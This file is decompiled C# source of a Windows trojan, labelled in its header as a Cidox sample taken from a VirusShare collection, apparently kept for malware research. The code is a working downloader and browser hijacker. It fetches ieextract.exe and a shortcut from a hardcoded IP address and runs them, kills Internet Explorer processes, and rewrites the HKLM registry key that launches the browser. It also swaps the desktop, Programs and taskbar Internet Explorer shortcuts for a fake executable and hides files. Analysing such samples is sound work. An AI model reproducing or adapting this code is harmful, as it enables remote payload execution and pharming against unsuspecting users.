// Decompiled with JetBrains decompiler
// Type: Pharming_v6.ie
// Assembly: Pendencias, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4D4E4522-F191-4AA9-9B68-22EA4D196EE5
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Cidox.mgv-6279207241264840f782051166268af0f3e2a91bba87f5e854aca1f5d9198ea9.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using Pharming_v6.My;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace Pharming_v6
{
  [StandardModule]
  internal sealed class ie
  {
    public static void ie()
    {
      string path = Module1.temp + "wingbiso.txt";
      try
      {
        if (!System.IO.File.Exists(path))
        {
          using (System.IO.File.Create(path))
            ;
          using (StreamWriter streamWriter = new StreamWriter(path))
            streamWriter.Write("infected");
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      if (MyProject.Computer.FileSystem.FileExists(Module1.temp + "\\extractie\\ieextract.exe"))
        return;
      string parentPath = MyProject.Computer.FileSystem.GetParentPath(MyProject.Computer.FileSystem.SpecialDirectories.Programs);
      string address1 = "http://64.250.116.233/ieextract.exe";
      MyProject.Computer.FileSystem.CreateDirectory(Module1.temp + "\\extractie");
      try
      {
        new WebClient().DownloadFile(address1, Module1.temp + "\\extractie\\ieextract.exe");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      string address2 = "http://64.250.116.233/player";
      try
      {
        new WebClient().DownloadFile(address2, Module1.temp + "\\extractie\\Internet Explorer.lnk");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      Process.Start(Module1.temp + "\\extractie\\ieextract.exe");
      try
      {
        Process[] processesByName = Process.GetProcessesByName("iexplore");
        int index = 0;
        while (index < processesByName.Length)
        {
          processesByName[index].Kill();
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      Thread.Sleep(20000);
      Registry.LocalMachine.OpenSubKey("Software\\Clients\\StartMenuInternet\\IEXPLORE.EXE\\shell\\open\\command\\", true).SetValue("", (object) (Module1.temp + "extractie\\iexplore.exe"));
      if (MyProject.Computer.FileSystem.FileExists(MyProject.Computer.FileSystem.SpecialDirectories.Desktop + "\\Internet Explorer.lnk"))
      {
        MyProject.Computer.FileSystem.DeleteFile(MyProject.Computer.FileSystem.SpecialDirectories.Desktop + "\\Internet Explorer.lnk");
        Thread.Sleep(10000);
        MyProject.Computer.FileSystem.CopyFile(Module1.temp + "\\extractie\\iexplore.exe", MyProject.Computer.FileSystem.SpecialDirectories.Desktop + "\\Internet Explorer.exe", true);
        Process.Start(MyProject.Computer.FileSystem.SpecialDirectories.Desktop + "\\Internet Explorer.exe");
        Thread.Sleep(10000);
        Process[] processesByName = Process.GetProcessesByName("Internet Explorer");
        int index = 0;
        while (index < processesByName.Length)
        {
          processesByName[index].Kill();
          checked { ++index; }
        }
        System.IO.File.SetAttributes(MyProject.Computer.FileSystem.SpecialDirectories.Desktop + "\\Portable IE 8 PT-BR [By N1gh7w0lf] - (spbrasil-2009.blogspot.com)", FileAttributes.Hidden);
      }
      else
      {
        Thread.Sleep(10000);
        MyProject.Computer.FileSystem.CopyFile(Module1.temp + "\\extractie\\iexplore.exe", MyProject.Computer.FileSystem.SpecialDirectories.Desktop + "\\Internet Explorer.exe", true);
        Process.Start(MyProject.Computer.FileSystem.SpecialDirectories.Desktop + "\\Internet Explorer.exe");
        Thread.Sleep(10000);
        Process[] processesByName = Process.GetProcessesByName("Internet Explorer");
        int index = 0;
        while (index < processesByName.Length)
        {
          processesByName[index].Kill();
          checked { ++index; }
        }
        System.IO.File.SetAttributes(MyProject.Computer.FileSystem.SpecialDirectories.Desktop + "\\Portable IE 8 PT-BR [By N1gh7w0lf] - (spbrasil-2009.blogspot.com)", FileAttributes.Hidden);
      }
      if (MyProject.Computer.FileSystem.FileExists(MyProject.Computer.FileSystem.SpecialDirectories.Programs + "\\Internet Explorer.lnk"))
        MyProject.Computer.FileSystem.DeleteFile(MyProject.Computer.FileSystem.SpecialDirectories.Programs + "\\Internet Explorer.lnk");
      if (MyProject.Computer.FileSystem.FileExists(parentPath + "Internet Explorer.lnk"))
      {
        MyProject.Computer.FileSystem.DeleteFile(parentPath + "\\Internet Explorer.lnk");
        Thread.Sleep(10000);
        MyProject.Computer.FileSystem.CopyFile(Module1.temp + "\\extractie\\iexplore.exe", parentPath + "\\Internet Explorer.exe", true);
        Process.Start(parentPath + "\\Internet Explorer.exe");
        Thread.Sleep(10000);
        Process[] processesByName = Process.GetProcessesByName("Internet Explorer");
        int index = 0;
        while (index < processesByName.Length)
        {
          processesByName[index].Kill();
          checked { ++index; }
        }
        System.IO.File.SetAttributes(parentPath + "\\Portable IE 8 PT-BR [By N1gh7w0lf] - (spbrasil-2009.blogspot.com)", FileAttributes.Hidden);
      }
      else
      {
        Thread.Sleep(10000);
        MyProject.Computer.FileSystem.CopyFile(Module1.temp + "\\extractie\\iexplore.exe", parentPath + "\\Internet Explorer.exe", true);
        Process.Start(parentPath + "\\Internet Explorer.exe");
        Thread.Sleep(10000);
        Process[] processesByName = Process.GetProcessesByName("Internet Explorer");
        int index = 0;
        while (index < processesByName.Length)
        {
          processesByName[index].Kill();
          checked { ++index; }
        }
        System.IO.File.SetAttributes(parentPath + "\\Portable IE 8 PT-BR [By N1gh7w0lf] - (spbrasil-2009.blogspot.com)", FileAttributes.Hidden);
      }
      try
      {
        if (MyProject.Computer.FileSystem.FileExists(Module1.appdata + "\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Internet Explorer.lnk"))
        {
          MyProject.Computer.FileSystem.DeleteFile(Module1.appdata + "\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Internet Explorer.lnk");
          Thread.Sleep(10000);
          MyProject.Computer.FileSystem.CopyFile(Module1.temp + "\\extractie\\Internet Explorer.lnk", Module1.appdata + "\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Internet Explorer.lnk", true);
        }
        else
        {
          Thread.Sleep(10000);
          MyProject.Computer.FileSystem.CopyFile(Module1.temp + "\\extractie\\Internet Explorer.lnk", Module1.appdata + "\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Internet Explorer.lnk", true);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
